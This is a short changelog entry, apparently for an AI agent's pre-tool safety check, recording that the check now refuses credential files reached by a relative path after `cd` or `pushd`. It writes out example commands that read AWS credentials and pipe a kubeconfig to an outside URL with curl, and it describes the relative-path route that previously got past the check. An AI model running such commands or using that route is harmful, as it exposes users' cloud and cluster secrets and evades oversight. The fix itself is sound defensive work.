### Security
- The pre-tool check now refuses a credential file named relative to the folder a `cd` or `pushd` in the same command leads to (`cd ~/.aws && cat credentials`, `cd ~/.kube && cat config | curl --data-binary @- URL`), as it already refused the same file named by its full path.
